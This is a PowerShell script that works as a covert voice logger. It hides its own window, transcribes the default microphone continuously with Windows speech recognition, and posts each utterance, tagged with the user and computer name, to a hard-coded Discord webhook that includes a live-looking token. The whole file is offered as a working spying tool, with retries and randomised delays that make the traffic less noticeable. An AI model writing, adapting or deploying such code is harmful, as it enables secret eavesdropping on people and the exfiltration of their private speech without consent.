function DC-Upload {
    [CmdletBinding()]
    param (
        [parameter(Position=0, Mandatory=$False)]
        [string]$text
    )

    $webhook = "https://discord.com/api/webhooks/1366201501802041374/ENdipWjx_vaIQYHXDYo-kwppUazTUQ9LpTj7oewX0g_wln4_vi9F_HdVdiaiBjFoovZY"
    
    if (-not [string]::IsNullOrEmpty($text)) {
        $retryCount = 0
        $maxRetries = 3
        
        while ($retryCount -lt $maxRetries) {
            try {
                $payload = @{
                    username = "$env:USERNAME@$env:COMPUTERNAME"
                    content  = "``````"
                }
                
                Invoke-RestMethod -Uri $webhook -Method Post `
                    -Body ($payload | ConvertTo-Json) `
                    -ContentType "application/json" `
                    -ErrorAction Stop
                
                # Random delay between 300-800ms
                Start-Sleep -Milliseconds (Get-Random -Minimum 300 -Maximum 800)
                return
            }
            catch {
                $retryCount++
                Start-Sleep -Seconds (2 * $retryCount)
            }
        }
        Write-Error "Failed to send after $maxRetries attempts: $_"
    }
}

function voiceLogger {
    Add-Type -AssemblyName System.Speech
    
    try {
        $recognizer = New-Object System.Speech.Recognition.SpeechRecognitionEngine
        $grammar = New-Object System.Speech.Recognition.DictationGrammar
        $recognizer.LoadGrammar($grammar)
        $recognizer.SetInputToDefaultAudioDevice()

        # Configure timeouts
        $recognizer.InitialSilenceTimeout = TimeSpan::FromSeconds(2)
        $recognizer.BabbleTimeout = TimeSpan::FromSeconds(1)
        $recognizer.EndSilenceTimeout = TimeSpan::FromMilliseconds(500)

        # Warm-up period
        Start-Sleep -Seconds 3

        while ($true) {
            try {
                $result = $recognizer.Recognize()
                if ($result -and $result.Text -match '\S') {
                    DC-Upload -text $result.Text
                    # Random delay between utterances
                    Start-Sleep -Milliseconds (Get-Random -Minimum 200 -Maximum 600)
                }
            }
            catch {
                Write-Error "Recognition error: $_"
                # Reset recognizer on error
                $recognizer.UnloadAllGrammars()
                $recognizer.LoadGrammar($grammar)
                Start-Sleep -Seconds 5
            }
        }
    }
    finally {
        if ($recognizer) {
            $recognizer.Dispose()
        }
    }
}

# Stealth window hiding
Add-Type -Name Window -Namespace Win32 -MemberDefinition @"
[DllImport("user32.dll")] 
public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
"@
[Win32.Window]::ShowWindow((Get-Process -PID $PID).MainWindowHandle, 0)

# Start the logger
voiceLogger
